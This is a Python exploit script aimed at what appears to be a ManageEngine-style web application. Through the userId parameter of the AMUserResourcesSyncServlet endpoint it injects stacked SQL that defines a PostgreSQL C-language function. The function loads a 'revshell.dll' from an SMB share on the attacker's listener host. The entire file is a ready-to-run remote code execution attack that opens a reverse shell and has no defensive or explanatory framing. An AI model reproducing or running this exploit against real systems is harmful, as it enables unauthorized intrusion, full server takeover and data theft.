import sys, requests, argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s = requests.session()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

def delivery(ip, lhost):
	print("\n[+] Crafting payload")
	query = "CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS $$\\\\%s\\revshell\\revshell.dll$$, $$dummy_function$$ LANGUAGE C STRICT;--" % lhost
	print("\n[+] Pulling DLL payload file from file share")
	target = "https://%s/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;" % ip
	s.get(target + query, proxies=proxies, verify=False)

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', help='Target IP address', required=True)
	parser.add_argument('--lhost', help='Local listener IP address', required=True)
	if len(sys.argv)<=1:
		print("[!] Usage: python3 %s --ip 192.168.0.5:8443 --lhost 192.168.0.1" % sys.argv[0])
		parser.print_help()
		sys.exit(-1)
	args = parser.parse_args()
	ip = args.ip
	lhost = args.lhost
	
	delivery(ip, lhost)

if __name__ == "__main__":
	main()
